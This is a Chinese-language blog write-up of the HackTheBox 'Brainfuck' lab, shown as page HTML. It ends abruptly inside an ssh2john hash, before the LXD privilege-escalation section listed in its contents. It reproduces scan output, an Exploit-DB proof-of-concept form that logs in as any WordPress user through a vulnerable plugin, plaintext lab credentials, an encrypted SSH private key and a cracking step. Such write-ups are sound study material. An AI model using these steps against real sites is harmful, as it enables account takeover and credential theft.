@@ -1,0 +1,857 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HackTheBox - Brainfuck - Yueyejian’s Blog</title>
+<meta name="description" content="HackTheBox - Brainfuck About Brainfuck Brainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many.">
+
+
+  <meta name="author" content="yueyejian">
+  
+  <meta property="article:author" content="yueyejian">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Yueyejian's Blog">
+<meta property="og:title" content="HackTheBox - Brainfuck">
+<meta property="og:url" content="http://localhost:4000/hack-the-box/brainfuck/">
+
+
+  <meta property="og:description" content="HackTheBox - Brainfuck About Brainfuck Brainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many.">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2023-08-14T00:00:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/hack-the-box/brainfuck/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "yueyejian",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Yueyejian's Blog
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="https://yueyejian13.github.io">
+        <img src="/assets/images/avatar.jpg" alt="yueyejian" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="https://yueyejian13.github.io" itemprop="url">yueyejian</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Somewhere in China.</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://yueyejian13.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">首页</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/yueyejian13" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://paypal.me/yueyejian?country.x=C2&locale.x=zh_XC" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HackTheBox - Brainfuck">
+    <meta itemprop="description" content="HackTheBox - BrainfuckAbout BrainfuckBrainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many.">
+    <meta itemprop="datePublished" content="2023-08-14T00:00:00+08:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HackTheBox - Brainfuck
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2023-08-14T00:00:00+08:00">August 14, 2023</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          20 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu"><li><a href="#hackthebox---brainfuck">HackTheBox - Brainfuck</a><ul><li><a href="#about-brainfuck">About Brainfuck</a></li><li><a href="#nmap">Nmap</a></li><li><a href="#wpscan">WPScan</a></li><li><a href="#exploit">Exploit</a></li><li><a href="#decrypt">Decrypt</a></li><li><a href="#lxd提权">Lxd提权</a></li></ul></li></ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="hackthebox---brainfuck">HackTheBox - Brainfuck</h1>
+<h2 id="about-brainfuck">About Brainfuck</h2>
+<p>Brainfuck, while not having any one step that is too difficult, requires many different steps and exploits to complete. A wide range of services, vulnerabilities and techniques are touched on, making this machine a great learning experience for many.</p>
+
+<p><img src="/images/hackthebox/brainfuck/0.png" alt="" /></p>
+
+<h2 id="nmap">Nmap</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ cat nmap.txt 
+# Nmap 7.93 scan initiated Sun Aug 13 23:13:58 2023 as: nmap -n -v -sC -sV --min-rate=1500 -p- -oN nmap.txt 10.10.10.17
+Nmap scan report for 10.10.10.17
+Host is up (0.42s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA)
+|   256 6bd5dc153a667af419915d7385b24cb2 (ECDSA)
+|_  256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519)
+25/tcp  open  smtp     Postfix smtpd
+|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+110/tcp open  pop3     Dovecot pop3d
+|_pop3-capabilities: SASL(PLAIN) PIPELINING UIDL USER TOP RESP-CODES AUTH-RESP-CODE CAPA
+143/tcp open  imap     Dovecot imapd
+|_imap-capabilities: ID capabilities more AUTH=PLAINA0001 have IDLE listed LOGIN-REFERRALS IMAP4rev1 post-login Pre-login OK ENABLE LITERAL+ SASL-IR
+443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-title: Welcome to nginx!
+|_http-server-header: nginx/1.10.0 (Ubuntu)
+| tls-nextprotoneg: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
+| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
+| Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
+| Public Key type: rsa
+| Public Key bits: 3072
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2017-04-13T11:19:29
+| Not valid after:  2027-04-11T11:19:29
+| MD5:   cbf1689996aaf7a005650fc094917f20
+|_SHA-1: f448e798a8175580879c8fb8ef0e2d3dc656cb66
+Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Aug 13 23:16:35 2023 -- 1 IP address (1 host up) scanned in 156.94 seconds
+</code></pre></div></div>
+<p>可以发现443端口的ssl证书内容中有几个域名，把这几个域名加到/etc/hosts里去和ip地址绑定，然后访问，得到了两个网站，一个是WordPress的博客，还得到了一个邮箱</p>
+
+<p><img src="/images/hackthebox/brainfuck/1.png" alt="" /></p>
+
+<p>还有一个网站是一个Super Secret Forum –超级神秘后台，在这里面我们可以看到两个用户名</p>
+
+<p><img src="/images/hackthebox/brainfuck/2.png" alt="" /></p>
+
+<h2 id="wpscan">WPScan</h2>
+<p>对第一个网站用WPScan扫描一下，加上扩展的漏扫和用户的枚举，要去官网注册一个免费的token，用这个token一天可以扫25次</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ WPScan --url https://brainfuck.htb/ --disable-tls-checks --api-token FD4Mg8hQgD3ufcCLEQPSghvDCFscCOTpEPJWb6V5lVA -e vp,u -o wpscan.txt
+</code></pre></div></div>
+<p>部分扫描结果</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ cat wpscan.txt       
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: https://brainfuck.htb/ [10.10.10.17]
+[+] Started: Mon Aug 14 00:43:37 2023
+
+[+] wp-support-plus-responsive-ticket-system
+ | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
+ | Last Updated: 2019-09-03T07:57:00.000Z
+ | [!] The version is out of date, the latest version is 9.1.2
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | [!] 6 vulnerabilities identified:
+ |
+ | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.0 – Authenticated SQL Injection
+ |     Fixed in: 8.0.0
+ |     References:
+ |      - https://wpscan.com/vulnerability/f267d78f-f1e1-4210-92e4-39cce2872757
+ |      - https://www.exploit-db.com/exploits/40939/
+ |      - https://lenonleite.com.br/en/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/
+ |      - https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system
+ |
+ | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.8 - Remote Code Execution (RCE)
+ |     Fixed in: 8.0.8
+ |     References:
+ |      - https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1
+ |      - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system
+ |
+ | [!] Title: WP Support Plus Responsive Ticket System &lt; 9.0.3 - Multiple Authenticated SQL Injection
+ |     Fixed in: 9.0.3
+ |     References:
+ |      - https://wpscan.com/vulnerability/cbbdb469-7321-44e4-a83b-cac82b116f20
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000131
+ |      - https://github.com/00theway/exp/blob/master/wordpress/wpsupportplus.md
+ |      - https://plugins.trac.wordpress.org/changeset/1814103/wp-support-plus-responsive-ticket-system
+ |
+ | [!] Title: WP Support Plus Responsive Ticket System &lt; 9.1.2 - Stored XSS
+ |     Fixed in: 9.1.2
+ |     References:
+ |      - https://wpscan.com/vulnerability/e406c3e8-1fab-41fd-845a-104467b0ded4
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7299
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15331
+ |      - https://cert.kalasag.com.ph/news/research/cve-2019-7299-stored-xss-in-wp-support-plus-responsive-ticket-system/
+ |      - https://plugins.trac.wordpress.org/changeset/2024484/wp-support-plus-responsive-ticket-system
+ |
+ | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.0 - Privilege Escalation
+ |     Fixed in: 8.0.0
+ |     References:
+ |      - https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f
+ |      - https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
+ |      - https://packetstormsecurity.com/files/140413/
+ |
+ | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.8 - Remote Code Execution
+ |     Fixed in: 8.0.8
+ |     References:
+ |      - https://wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f
+ |      - https://plugins.trac.wordpress.org/changeset/1763596
+ |
+ | Version: 7.1.3 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
+
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] administrator
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] WPScan DB API OK
+ | Plan: free
+ | Requests Done (during the scan): 0
+ | Requests Remaining: 22
+
+[+] Finished: Mon Aug 14 00:44:17 2023
+[+] Requests Done: 28
+[+] Cached Requests: 41
+[+] Data Sent: 7.166 KB
+[+] Data Received: 84.54 KB
+[+] Memory used: 253.984 MB
+[+] Elapsed time: 00:00:39
+</code></pre></div></div>
+
+<p>可见有一个扩展叫做WP Support Plus，其存在多个漏洞，还检测到了用户admin以及administrator的存在。用searchsploit查一下这个扩展的漏洞，把注意力放在中间的权限提升漏洞上面</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ searchsploit WP Support Plus           
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                            |  Path
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities                                  | php/webapps/34589.txt
+WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation                                    | php/webapps/41006.txt
+WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection                                           | php/webapps/40939.txt
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ locate php/webapps/41006.txt
+/usr/share/exploitdb/exploits/php/webapps/41006.txt
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ more /usr/share/exploitdb/exploits/php/webapps/41006.txt
+# Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
+# Date: 10-01-2017
+# Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: web
+
+1. Description
+
+You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().
+
+http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
+
+2. Proof of Concept
+
+&lt;form method="post" action="http://wp/wp-admin/admin-ajax.php"&gt;
+        Username: &lt;input type="text" name="username" value="administrator"&gt;
+        &lt;input type="hidden" name="email" value="sth"&gt;
+        &lt;input type="hidden" name="action" value="loginGuestFacebook"&gt;
+        &lt;input type="submit" value="Login"&gt;
+&lt;/form&gt;
+
+Then you can go to admin panel.
+
+</code></pre></div></div>
+<h2 id="exploit">Exploit</h2>
+
+<p>好的，也就是说我们在本地构建一个这样的表单，就可以任意用户登录了。创建一个文件login.html,内容为上面这个表单，再把网站，用户名填上去，然后用firefox打开这个文件点击login，再回到原来的brainfuck网站刷新一哈，admin就已经在线了</p>
+
+<p><img src="/images/hackthebox/brainfuck/3.png" alt="" /></p>
+
+<p>在后台可以看到一个SMTP的配置按钮
+<img src="/images/hackthebox/brainfuck/4.png" alt="" /></p>
+
+<p>点进去可以看到SMTP的用户名orestis和密码，修改一下前端即可看到密码</p>
+
+<p><img src="/images/hackthebox/brainfuck/5.png" alt="" /></p>
+
+<p>用获取到的用户名和密码登录Dovecot，得到两封邮件，里面有orestis在超级私密论坛的账号和密码</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
+└─$ telnet 10.10.10.17 110
+Trying 10.10.10.17...
+Connected to 10.10.10.17.
+Escape character is '^]'.
++OK Dovecot ready.
+USER orestis
++OK
+PASS kHGuERB29DNiNE
++OK Logged in.
+LIST
++OK 2 messages:
+1 977
+2 514
+.
+RETR 1
++OK 977 octets
+Return-Path: &lt;www-data@brainfuck.htb&gt;
+X-Original-To: orestis@brainfuck.htb
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck (Postfix, from userid 33)
+        id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)
+To: orestis@brainfuck.htb
+Subject: New WordPress Site
+X-PHP-Originating-Script: 33:class-phpmailer.php
+Date: Mon, 17 Apr 2017 17:15:40 +0000
+From: WordPress &lt;wordpress@brainfuck.htb&gt;
+Message-ID: &lt;00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb&gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+
+Your new WordPress site has been successfully set up at:
+
+https://brainfuck.htb
+
+You can log in to the administrator account with the following infrmation:
+
+Username: admin
+Password: The password you chose during the install.
+Log in here: https://brainfuck.htb/wp-login.php
+
+We hope you enjoy your new site. Thanks!
+
+--The WordPress Team
+https://wordpress.org/
+.
+RETR 2
++OK 514 octets
+Return-Path: &lt;root@brainfuck.htb&gt;
+X-Original-To: orestis
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck (Postfix, from userid 0)
+        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
+To: orestis@brainfuck.htb
+Subject: Forum Access Details
+Message-Id: &lt;20170429101206.4227420AEB@brainfuck&gt;
+Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
+From: root@brainfuck.htb (root)
+
+Hi there, your credentials for our "secret" forum are below :)
+
+username: orestis
+password: kIEnnfEKJ#9UmdO
+
+Regards
+.
+
+</code></pre></div></div>
+<h2 id="decrypt">Decrypt</h2>
+
+<p>用从邮件里得到的账号和密码登录super secret forum，在里面可以看到一段有趣的对话，主要内容是orestis向admin索要ssh key</p>
+
+<p><img src="/images/hackthebox/brainfuck/5.png" alt="" /></p>
+
+<p>其中一段对话用了vigenere加密，Google rumkin vigenere得到解密工具，用原文和密文得到key是fuckmybrain……
+<img src="/images/hackthebox/brainfuck/6.png" alt="" /></p>
+
+<p>将对话解密，得到了ssh key的下载地址</p>
+
+<p><img src="/images/hackthebox/brainfuck/7.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
+</code></pre></div></div>
+
+<p>把key下载下来，发现需要密码，于是用john破解，得到了密码是<code class="language-plaintext highlighter-rouge">3poulakia!</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ wget https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa --no-check-certificate
+--2023-08-14 01:49:35--  https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
+Resolving brainfuck.htb (brainfuck.htb)... 10.10.10.17
+Connecting to brainfuck.htb (brainfuck.htb)|10.10.10.17|:443... connected.
+WARNING: The certificate of ‘brainfuck.htb’ is not trusted.
+WARNING: The certificate of ‘brainfuck.htb’ doesn't have a known issuer.
+The certificate's owner does not match hostname ‘brainfuck.htb’
+HTTP request sent, awaiting response... 200 OK
+Length: 1766 (1.7K) [application/octet-stream]
+Saving to: ‘id_rsa’
+
+id_rsa                            100%[=============================================================&gt;]   1.72K  --.-KB/s    in 0s      
+
+2023-08-14 01:49:39 (30.9 MB/s) - ‘id_rsa’ saved [1766/1766]
+
+                                                                                                                                        
+┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ ls
+id_rsa  login.html  nmap.txt  wpscan.txt
+                                                                                                                                        
+┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ cat id_rsa  
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382
+
+mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
+B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
+W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
+7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
+zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
+oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
+dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
+Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
+mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
+LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
+ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
+krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
+gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
+VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
+schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
+UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
+F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
+wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
+Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
+IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
+mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
+CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
+9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
+EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
+6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
+-----END RSA PRIVATE KEY-----
+                                                                                                                                        
+
+                                                                                                                                        
+┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ ssh2john id_rsa &gt; id_rsa2        
+                                                                                                                                        
+┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ cat id_rsa2
+id_rsa:$sshng$1$16$6904FEF19397786F75BE2D7762AE7382$1200$9a779a83f60263c001f8e2ddae0b722aa9eb7531f09a95864cd5bda5f847b0dcfc09f19d03181c8546877a84e3feb87f0769d2e3ef426012bc211dd5b79168ecfa160428c0030598971f9c2b4c350d7a9adc0f812e5b122342b0b3d8de6ba1a25b599afd5ed6a0927e57824d23bb9f4e143238450eefa3e560d44cf54105f0c00d42624adfb31df44ceee77c09a54a99edd29c83a00cfe8f5584e969897ed220d4fd75129a29ebce8e8a516f210532588fd351fb6656a158f7514667c25d2990cf11fd2369462104ed451037ac592d2e935e74d3ee650092b3051e73b79556dda673666ff4f33d9424c9b914b3cd5ba6a33dd712785a1a63f58e63285415a20fed91ae72fac27cfd92cb15fad802574983f7b592fb5c9d5843de0a9874e8c7a674b4762f5baf04625ebfc8bd84fded869d68c2f33c1e089dc9f302daf381bd76dc000ddb0cabd1e23b33da86dfe4017e16fb7aa6632e8b1f216e2a4fd75d94b39e324effe1c82f8ce60d61594ba3e72e31a2f82bd0b2df236a467be16fe655d399cce773566a0d8e65ae5996cd3bec5bb87bae6f4b2a01221e7f601a0aa23a544a9f915497e0e57da00c1d689850a62c2d2315bc323ac3cf2065bd74d8a0f6938355d0fe8e7572022403046b59923a4fcb4bf98b3b87b4377c045fe36d8156eaba5f60b929686dab085f90e401c63e111de3fbf61e7e9c849d8b3efed7d34f5a0cf814774d54a525c3abbcd9ab232e7d92b295b6e97101e8d5433c489963940d80bde3b4d7bbd040b21d0c2e82ada4844bdc771bbbebe2f4be679f92e484efd581d3323b2013a2bec09aedb16fddce3b9e572a4075962c36ae55a0eac0695ccd56520a0c416e7429ea3a3b48f37867c057098cef65db6ae82684a5b6e6aff8ebfc8be1530ab83c872f91dcf8ebf9bf76d0f74f29f94adfd38769be3f528c1ce7b1c86aa33a20702d547c97029ba725fbdebb18505adeb0f9603a77c76c72215f5241dc06bc7d1921ca7474a2a431566d517f214eabf544e4780a4f06d7333a59ce10a87e8352a1a2dedafb9d8c32ef0c75249e96461a7259d2feb2ef1ff7a2a717b83064bb553fceddf11dee0044599f114ef4cb8e654dbe3c49c35dd48248cbf7a97f45bcf618dce3ca6ecc62032f8cc197b32cd8a9f345e671527019462c767fa207f50f31d757d76277d1851bb70fd1df84d08911548562d316b98e68b69b22a9792fed0911b799f4ee7a0da5c5a8fde05e1331f3104a5106b1d9ec684eb7a8c42239edac41401a9384483f1d30b22103e61d6dfa9b1b5cf8894c0c4c5d2c7583ee69cdb88752862011e9b5d861233713bdb97f32c4d4c16ee395641c38859b1cbd11543ebf8f64838c85c1434f3dbb0ea6929cee0256a52d58fe2fab0ca83c6